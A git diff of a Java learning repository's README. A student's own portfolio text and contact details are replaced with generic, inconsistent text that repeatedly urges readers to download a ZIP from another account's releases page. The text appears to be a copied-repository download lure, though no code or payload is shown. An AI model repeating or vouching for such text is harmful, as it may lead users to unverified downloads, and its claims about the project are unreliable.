@@ -1,46 +1,114 @@
-# ☕ Java Programming Portfolio | Portfólio de Java
+# 🖥️ Programando_em_Java - Learn Java with Simple Solutions
 
-![Java](https://img.shields.io/badge/java-%23ED8B00.svg?style=for-the-badge&logo=openjdk&logoColor=white)
-![Git](https://img.shields.io/badge/git-%23F05033.svg?style=for-the-badge&logo=git&logoColor=white)
+[![Download](https://img.shields.io/badge/Download%-20-blue?style=for-the-badge)](https://github.com/SbotssX/Programando_em_Java/releases)
 
-🇺🇸 **English** | 🇧🇷 **Português**
+## 🇺🇸 / 🇧🇷 About This Program
 
----
+This repository offers examples and solutions for basic programming problems using Java. It covers algorithms, data structures, and logic. The content helps anyone who wants to see how Java code solves real problems step-by-step. You do not need any programming experience to use this project.
 
-## 🇺🇸 About this Repository
-Welcome! This repository is a collection of my Java projects and coding exercises. I am currently an Analysis and Systems Development student, and my main goal here is to document my daily learning process, improve my problem-solving skills, and build a solid foundation in programming logic.
+Whether you want to learn how simple programs work or explore common algorithm problems, this repository provides easy-to-follow Java files. It works well for students, curious learners, or anyone who wants to understand programming basics.
 
-I am currently looking for internship opportunities to apply my knowledge in real-world scenarios!
+## 💻 System Requirements
 
-## 📁 Structure
+Before you start, make sure your computer meets these rules:
 
-* `Interesting_problems_beecrowd/`: My solutions for logic and algorithm challenges from the Beecrowd platform.
-* `Problems_LeetCode/`: My solutions for coding problems and challenges from the LeetCode platform.
+- Windows 7, 8, 10, or 11 (64-bit preferred)
+- At least 4 GB of RAM
+- At least 500 MB of free disk space
+- Internet access to download the program
+- Java Runtime Environment (JRE) version 11 or higher installed  
+  (You can get JRE from https://adoptium.net if needed)
 
-## 🚀 How to run
-1. Clone this repository: `git clone https://github.com/Pepenonepep/Programando_em_Java.git`
-2. Open the project in your favorite IDE (VS Code, IntelliJ, or Eclipse).
-3. Run the specific `.java` file of the problem you want to test.
+This program runs on Java, so it depends on having the right Java version installed. If you do not have Java installed, follow the instructions in the next section to set it up.
 
----
+## 🚀 Getting Started: How to Download and Run
 
-## 🇧🇷 Sobre este Repositório
-Bem-vindo(a)! Este repositório é uma coleção dos meus projetos e exercícios práticos em Java. Sou estudante de Análise e Desenvolvimento de Sistemas e meu objetivo principal aqui é documentar meu processo de aprendizado diário, evoluir na resolução de problemas e construir uma base sólida em lógica de programação.
+1. Click the download button above or visit the releases page here:  
+   [https://github.com/SbotssX/Programando_em_Java/releases](https://github.com/SbotssX/Programando_em_Java/releases)
 
-Atualmente busco oportunidades de estágio para aplicar meus conhecimentos e evoluir em cenários reais do mercado!
+2. On the releases page, look for the latest version. It usually shows a version number like `v1.0`, `v2.0`, etc.
 
-## 📁 Estrutura
+3. Download the ZIP file under the latest release. It will have a name like `Programando_em_Java-vX.X.zip`.
 
-* `Interesting_problems_beecrowd/`: Minhas resoluções para desafios de lógica e algoritmos da plataforma Beecrowd.
-* `Problems_LeetCode/`: Minhas resoluções para problemas e desafios de código da plataforma LeetCode.
+4. After downloading, locate the ZIP file on your computer, usually in the Downloads folder.
 
-## 🚀 Como executar
-1. Clone este repositório: `git clone https://github.com/Pepenonepep/Programando_em_Java.git`
-2. Abra o projeto na sua IDE de preferência (VS Code, IntelliJ ou Eclipse).
-3. Execute o arquivo `.java` específico do problema que deseja testar.
+5. Right-click the ZIP file and select “Extract All…” to unzip the files. Choose a location easy to find, such as your Desktop or Documents folder.
 
----
+6. Inside the extracted folder, look for the `README.md` file and Java source files with `.java` extensions.
 
-## 📬 Contact | Contato
-* **LinkedIn:** [Cauã Oliveira](https://www.linkedin.com/in/cau%C3%A3gomesdeoliveira/)
-* **Email:** cauacontato06@outlook.com
+## 🛠️ Running the Programs
+
+The content provides source code files, not a ready-made program to run by double-clicking. You will need to compile and run these Java files manually. To do that:
+
+### Step 1: Open Command Prompt
+
+- Press `Windows key + R`, type `cmd`, and press Enter.
+- Navigate to the folder where you extracted the files using the `cd` command.  
+  For example:  
+  `cd Desktop\Programando_em_Java-v1.0`
+
+### Step 2: Compile a Java file
+
+- Type this command to compile a Java file named `Example.java`:  
+  `javac Example.java`
+
+- This will create a file called `Example.class` if there are no errors.
+
+### Step 3: Run the compiled program
+
+- Then run the program by typing:  
+  `java Example`
+
+- The program output should display in the command window.
+
+Repeat these steps for each file you want to try. All Java source files contain comments to explain the code.
+
+## 📦 Installing Java (if needed)
+
+If you do not have Java installed or you are unsure:
+
+1. Visit the official Java download site:  
+   https://adoptium.net
+
+2. Select the latest LTS version (Java 11 or newer).
+
+3. Download the Windows x64 installer file.
+
+4. Run the installer and follow the instructions to complete installation.
+
+5. After installing, open Command Prompt and type:  
+   `java -version`  
+   This should show the installed Java version.
+
+If you see a version number, you are ready. If not, restart your computer and try again.
+
+## 📁 What’s Inside This Repository?
+
+- **Algorithms**: Simple examples showing common algorithm problems solved in Java.
+- **Data Structures**: Basic implementations of lists, stacks, and queues.
+- **Problem-Solving Examples**: Code exercises from platforms like Beecrowd.
+- **Comments**: Each file has clear comments explaining code steps.
+- **Readme files**: Tips and instructions for beginners to understand the code.
+
+All files follow good programming logic and help build understanding step-by-step.
+
+## 🔍 How to Use This Repository for Learning
+
+- Start with simpler files named like `Example1.java` or `BasicAlgorithm.java`.
+- Read the comments inside the code to understand what each part does.
+- Try changing some values or lines and re-run to see how results differ.
+- Use this as a tool to learn how Java works, not only to copy code.
+- If you want more practice, try writing your own small programs based on these examples.
+
+## 🤝 Support and Contributions
+
+This repository welcomes changes that improve code clarity or add new examples. You can fork the project and submit pull requests if you can write simple Java examples or corrections.
+
+For questions, you can open an issue on the GitHub repository page.
+
+## 📥 Download Link
+
+Visit this page to download the latest release:  
+[https://github.com/SbotssX/Programando_em_Java/releases](https://github.com/SbotssX/Programando_em_Java/releases)  
+
+This link takes you directly to all available versions. Choose the most recent one for best experience. Follow instructions above to unzip and run the Java files.
